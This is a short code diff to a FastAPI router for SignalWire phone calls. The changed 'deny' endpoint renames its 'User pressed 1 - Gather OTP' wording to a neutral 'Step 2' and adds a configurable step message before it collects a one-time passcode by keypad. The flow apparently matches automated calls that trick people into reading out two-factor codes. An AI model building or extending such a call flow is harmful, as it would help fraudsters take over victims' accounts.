@@ -139,9 +139,9 @@ async def signalwire_first_input(call_id: str, request: Request, Digits: str = F
 
 @router.post("/signalwire/{call_id}/deny")
 async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(None)):
-    """Handle deny flow - User pressed 1 - Gather OTP"""
+    """Handle Step 2 - Play Step 2 Message and gather OTP"""
     try:
-        logger.info(f"Deny flow for call {call_id}, Digits: {Digits}")
+        logger.info(f"Step 2 for call {call_id}, Digits: {Digits}")
         
         # Get call from MongoDB
         call_data = await MongoDBService.get_call(call_id)
@@ -154,6 +154,8 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
         
         voice = call_data.get('tts_voice', 'Aurora')
         digits_required = call_data.get('digits', 6)
+        backend_url = os.getenv('BACKEND_URL', 'https://lanjutan-saya-1.preview.emergentagent.com')
+        step_2_message = call_data.get('step_2_message', '')
         
         # If OTP digits received
         if Digits and len(Digits) == digits_required:
